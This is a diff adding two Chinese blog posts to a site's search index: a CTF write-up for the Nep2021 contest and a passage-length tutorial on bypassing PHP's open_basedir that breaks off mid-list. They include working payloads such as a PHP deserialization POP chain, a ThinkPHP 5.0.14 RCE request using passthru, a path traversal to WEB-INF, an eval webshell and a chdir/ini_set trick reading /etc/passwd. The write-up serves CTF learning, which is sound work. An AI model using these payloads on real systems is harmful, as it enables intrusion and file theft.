@@ -3499,4 +3499,261 @@ payload：<code>?2333=data://text/plain,todat is a happy day&amp;file=ZmpdYSZmXG
         <tag>...</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Nep2021欢乐个人赛</title>
+    <url>/z_post/Nep2021%E6%AC%A2%E4%B9%90%E4%B8%AA%E4%BA%BA%E8%B5%9B/</url>
+    <content><![CDATA[<p>我太比较菜了，只出了3web，不过还是学到很多，感谢nep。</p>
+<p>99-196 | 排名-分数</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h2><p>改题了，一开始13字符，但是服务器崩了，抢不到。改完是7字符rce</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?len&#x3D;7&amp;nep&#x3D;&#96;&gt;cat&#96;;</span><br><span class="line">?len&#x3D;7&amp;nep&#x3D;&#96;*&gt;x&#96;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="bbxhh-revenge"><a href="#bbxhh-revenge" class="headerlink" title="bbxhh_revenge"></a>bbxhh_revenge</h2><p>每次访问都要更改ip（伪造不可用，我知道的都试了，不得行），考验代理的时候到了  </p>
+<p><code>?imagin=phpinfo();</code>，被骗了</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Nep2021%E6%AC%A2%E4%B9%90%E4%B8%AA%E4%BA%BA%E8%B5%9B/20210320155448.png" alt="image-20210320155448346"></p>
+<p>按它给的访问没东西，<code>?nepnep=phpinfo();&amp;imagin=system($_GET[&#39;nepnep&#39;]);</code>。。。</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Nep2021%E6%AC%A2%E4%B9%90%E4%B8%AA%E4%BA%BA%E8%B5%9B/20210320155622.png" alt="image-20210320155621951"></p>
+<p>最后<code>?nepnep=phpinfo();&amp;imagin=system($_GET[%27nepnep%27]);</code>，POST：<code>HuaiNvRenPaPaPa=</code>搜索flag即可</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Nep2021%E6%AC%A2%E4%B9%90%E4%B8%AA%E4%BA%BA%E8%B5%9B/20210320155359.png" alt="image-20210320155359763"></p>
+<h2 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h2><p>团长的题，还是很好的  </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  $username;</span><br><span class="line">    <span class="keyword">public</span>  $password;</span><br><span class="line">    <span class="keyword">public</span>  $choice;</span><br><span class="line">    <span class="keyword">public</span>  $register;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  $file;</span><br><span class="line">    <span class="keyword">public</span>  $filename;</span><br><span class="line">    <span class="keyword">public</span>  $content;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice=<span class="keyword">new</span> login(<span class="keyword">$this</span>-&gt;file,<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice = <span class="keyword">new</span> register();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;choice-&gt;checking(<span class="keyword">$this</span>-&gt;username,<span class="keyword">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file,$filename,$content</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=$file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=$filename;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content=$content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params">$username,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($username===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;$password===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file-&gt;open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params">$username,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($username===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;$password===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;success register admin&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;please register admin &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params">$filename, $content</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            shell($content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents($filename.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;a&#x27;</span>]!==$_GET[<span class="string">&#x27;b&#x27;</span>]&amp;&amp;(md5($_GET[<span class="string">&#x27;a&#x27;</span>]) === md5($_GET[<span class="string">&#x27;b&#x27;</span>])) &amp;&amp; (sha1($_GET[<span class="string">&#x27;a&#x27;</span>])=== sha1($_GET[<span class="string">&#x27;b&#x27;</span>])))&#123;</span><br><span class="line">    @unserialize(base64_decode($_POST[<span class="string">&#x27;unser&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简单pop，Game-&gt;login-&gt;Open</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  $username;</span><br><span class="line">    <span class="keyword">public</span>  $password;</span><br><span class="line">    <span class="keyword">public</span>  $choice;</span><br><span class="line">    <span class="keyword">public</span>  $register;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  $file;</span><br><span class="line">    <span class="keyword">public</span>  $filename;</span><br><span class="line">    <span class="keyword">public</span>  $content;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> open();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line">        <span class="comment">//$this-&gt;content = &#x27;ls /&gt;x&#x27;;</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;n\l /flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">open</span></span>&#123;&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Game()));</span><br></pre></td></tr></table></figure>
+
+<p>读到shell源码，以为就这么简单，其实并不</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//shell.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params">$cmd</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($cmd)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,$cmd))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> system($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还需要删除waf，<a href="https://xz.aliyun.com/t/6454">参考链接</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  $username;</span><br><span class="line">    <span class="keyword">public</span>  $password;</span><br><span class="line">    <span class="keyword">public</span>  $choice;</span><br><span class="line">    <span class="keyword">public</span>  $register;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  $file;</span><br><span class="line">    <span class="keyword">public</span>  $filename;</span><br><span class="line">    <span class="keyword">public</span>  $content;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;waf.txt&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = ZipArchive::OVERWRITE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Game()));</span><br></pre></td></tr></table></figure>
+
+<p>最后再用第一个payload即可  </p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Nep2021%E6%AC%A2%E4%B9%90%E4%B8%AA%E4%BA%BA%E8%B5%9B/20210321105559.png" alt="image-20210321105556830"></p>
+<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="hardcsharp"><a href="#hardcsharp" class="headerlink" title="hardcsharp"></a>hardcsharp</h2><p>第一次做RE，搜题目发现是C#写的</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Nep2021%E6%AC%A2%E4%B9%90%E4%B8%AA%E4%BA%BA%E8%B5%9B/20210321163731.png" alt="image-20210321163727660"></p>
+<p>在搜其逆向工具，发现**.Net Reflector**下载下来调试题目，main函数就是一个简单的aes加密</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Nep2021%E6%AC%A2%E4%B9%90%E4%B8%AA%E4%BA%BA%E8%B5%9B/20210321163905.png" alt="image-20210321163905901"></p>
+<p>将key算出来，用了在线工具，我是蓝狗</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Nep2021%E6%AC%A2%E4%B9%90%E4%B8%AA%E4%BA%BA%E8%B5%9B/20210321163949.png" alt="image-20210321163949694"></p>
+<p>最后解密即可</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Nep2021%E6%AC%A2%E4%B9%90%E4%B8%AA%E4%BA%BA%E8%B5%9B/20210321164014.png" alt="image-20210321164014376"></p>
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="faka-revenge"><a href="#faka-revenge" class="headerlink" title="faka_revenge"></a>faka_revenge</h2><p>​    这题不该做不出来的，欸，还是太菜了  </p>
+<p>url随便弄个不存在的出现报错，发现是tp，根据下载的文件全局搜索THINK_VERSION可以发现是5.0.14版本，这版本有rce的，一把梭，贴个Y4er大佬的<a href="https://y4er.com/post/thinkphp5-rce/">Thinkphp5 RCE总结</a>，ban了很多函数，但是passthru忘了ban，直接rce了</p>
+<p><code>http://1eb095c1-c0ac-410c-8f49-69c55cd6b1f1.node1.hackingfor.fun/?s=index</code>  </p>
+<p>POST: <code>_method=__construct&amp;method=get&amp;filter[]=passthru&amp;get[]=cat /*</code>  </p>
+<p>过几天就去复现tp漏洞</p>
+<h2 id="easy-tomcat"><a href="#easy-tomcat" class="headerlink" title="easy_tomcat"></a>easy_tomcat</h2><p>看到登陆框就想到注入，但是并没有，就放弃了。因为Java的洞确实不咋会。。。  </p>
+<p>然而看到Java的登陆框不应该想注入（大多jdbc开发的，预编译直接裂开），应该想到<code>register.jsp</code>，<code>login.jsp</code>，<code>index.jsp</code>。这题直接盲猜有注册页面，注册抓包，头像处有明显的文件读取，一开始测试直接读但是不行，有waf，加上前缀后缀也不行<code>static/img/../../WEB-INF/web.xml%00.png</code>，截断失败，看wp竟然是。。。<code>static/img/../../WEB-INF/web.xml</code>，吐血。注册成功登陆看头像源码</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>javademo.LoginServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>RegisterServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>javademo.RegisterServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>AdminServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>javademo.AdminServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>InitServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>javademo.InitServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/LoginServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>RegisterServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/RegisterServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>AdminServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/AdminServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>InitServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/InitServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如法炮制把所有文件下载下来（flag别想，小伙子），在InitServlet.class发现admin密码（反编译工具是 jd-gui）</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InitServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    List&lt;User&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    User admin_user = <span class="keyword">new</span> User();</span><br><span class="line">    admin_user.setUsername(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    admin_user.setPassword(<span class="string">&quot;no_one_knows_my_password_75767388428345&quot;</span>);</span><br><span class="line">    list.add(admin_user);</span><br><span class="line">    getServletContext().setAttribute(<span class="string">&quot;list&quot;</span>, list);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>登陆后发现admin只有删除功能，删除抓包发现是 json格式，源码中也有fastjson解析json，那就试试fastjson漏洞呗，fastjson-1.2.47-RCE一把梭结束，<a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE">参考连接</a>。</p>
+]]></content>
+      <categories>
+        <category>CTF做题记录</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>open_basedir一些绕过姿势</title>
+    <url>/z_post/open-basedir%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/</url>
+    <content><![CDATA[<h1 id="open-basedir简介"><a href="#open-basedir简介" class="headerlink" title="open_basedir简介"></a>open_basedir简介</h1><ul>
+<li><p>将php所能打开的文件限制在指定的目录树中，包括文件本身。这个指令是<em>不是</em>由安全模式打开或者关闭的影响  </p>
+</li>
+<li><p>当程序要使用例如include()、fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开。 </p>
+</li>
+<li><p>所有的符号连接都会被解析，所以不可能通过符号连接来避开此限制。如果文件不存在，则无法解析符号链接，并且将文件名与（已解析的）open_basedir进行比较</p>
+</li>
+<li><p>用<strong>open_basedir</strong>指定的限制是目录名，而不是前缀（官方说法）；实际上，如果开发者设置<strong>open_basedir</strong>为<code>/var/www/html/yq1ng</code>，没有最后一个斜线结束的话限制的为前缀而不是目录，例如，访问者可以访问<code>yq1ng</code>里面的文件，也能访问<code>yq1ngxxx</code>里面的文件；设置为<code>/var/www/html/yq1ng/</code>则是限制到<code>yq1ng</code>目录</p>
+</li>
+<li><p>影响范围：<strong>open_basedir不仅</strong>会影响文件系统功能；还可能会影响文件系统功能。例如，如果<code>MySQL</code>配置为使用<code>mysqlnd</code>驱动程序， <code>LOAD DATA INFILE</code>则会受到<strong>open_basedir的</strong>影响。PHP的许多扩展功能都<code>open_basedir</code>以这种方式使用</p>
+</li>
+<li><p>注意：使用open_basedir会将<a href="https://www.php.net/manual/en/ini.core.php#ini.realpath-cache-size">realpath_cache_size</a>设置 为<code>0</code>，从而<em>禁用</em>realpath缓存。这样会降低php处理速度  </p>
+<p>特殊值<code>.</code> 表示脚本的工作目录将用作基本目录。但是，这有点危险，因为可以使用<a href="https://www.php.net/manual/en/function.chdir.php">chdir()</a>轻松更改脚本的工作目录  </p>
+<p>在Windows下，用分号分隔目录。在所有其他系统上，请用冒号分隔目录。作为Apache模块，父目录的<strong>open_basedir</strong>路径现在会自动继承  </p>
+<p>连续使用<strong>open_basedir</strong>并不会覆盖</p>
+</li>
+</ul>
+<a id="more"></a>
+
+<h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><p>docker：<code>docker pull php:7.4.9-apache-buster</code></p>
+<p><del>php.ini：<code>open_basedir = &#39;/var/www/html/&#39;</code></del></p>
+<p><del>一句话脚本：<code>&lt;?php eval($_GET[&#39;shell&#39;]);?&gt;</code></del></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//测试脚本,和上面一样的效果，这样测试更容易切换</span></span><br><span class="line">    ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">&#x27;shell&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>验证：<code>?shell=var_dump(scandir(&#39;./&#39;));</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%80%BB%E7%BB%93/20210324155814.png" alt="image-20210324155813831"></p>
+<p><code>?shell=var_dump(scandir(&#39;../&#39;));</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%80%BB%E7%BB%93/20210324155854.png" alt="image-20210324155854116"></p>
+<h1 id="chdir"><a href="#chdir" class="headerlink" title="chdir()"></a>chdir()</h1><p>手册说chdir()是个危险的函数，然后@edgarboda推特发布了一个poc  </p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%80%BB%E7%BB%93/20210324165957.png" alt="image-20210324165957031"></p>
+<p>payload：<code>mkdir(&#39;test&#39;);chdir(&#39;test&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);system(&#39;cat ../../../../../etc/passwd&#39;);</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%80%BB%E7%BB%93/20210324165920.png" alt="image-20210324165918666"></p>
+<p>底层解析：<a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/">从PHP底层看open_basedir bypass</a></p>
+<h1 id="系统函数绕过"><a href="#系统函数绕过" class="headerlink" title="系统函数绕过"></a>系统函数绕过</h1><p>这种很鸡肋吧，一般都会有disable_function</p>
+<p>pl：<code>system(&#39;cd /;cat /etc/passwd;&#39;);</code>   or   <code>system(&#39;cat ../../../../../etc/passwd&#39;);</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%80%BB%E7%BB%93/20210324170257.png" alt="image-20210324170257114"></p>
+<h1 id="glob-协议"><a href="#glob-协议" class="headerlink" title="glob://协议"></a>glob://协议</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
+<li>glob:// — 查找匹配的文件路径模式</li>
+<li>数据流包装器自 PHP 5.3.0 起开始有效</li>
+<li><strong>封装协议摘要</strong></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="left">属性</th>
+<th align="left">支持</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">受限于 <a href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen">allow_url_fopen</a></td>
+<td align="left">No</td>
+</tr>
+<tr>
+<td align="left">受限于 <a href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include">allow_url_include</a></td>
+<td align="left">No</td>
+</tr>
+<tr>
+<td align="left">允许读取</td>
+<td align="left">No</td>
+</tr>
+<tr>
+<td align="left">允许写入</td>
+<td align="left">No</td>
+</tr>
+<tr>
+<td align="left">允许附加</td>
+<td align="left">No</td>
+</tr>
+<tr>
+<td align="left">允许同时读写</td>
+<td align="left">No</td>
+</tr>
+<tr>
+<td align="left">支持 <a href="https://www.php.net/manual/zh/function.stat.php">stat()</a></td>
+<td align="left">No</td>
+</tr>
+<tr>
+<td align="left">支持 <a href="https://www.php.net/manual/zh/function.unlink.php">unlink()</a></td>
+<td align="left">No</td>
+</tr>
+<tr>
+<td align="left">支持 <a href="https://www.php.net/manual/zh/function.rename.php">rename()</a></td>
+<td align="left">No</td>
+</tr>
+<tr>
+<td align="left">支持 <a href="https://www.php.net/manual/zh/function.mkdir.php">mkdir()</a></td>
+<td align="left">No</td>
+</tr>
+<tr>
+<td align="left">支持 <a href="https://www.php.net/manual/zh/function.rmdir.php">rmdir()</a></td>
+<td align="left">No</td>
+</tr>
+</tbody></table>
+<p>可以看到其并不受限于open_basedir</p>
+<ul>
+<li><p>示例</p>
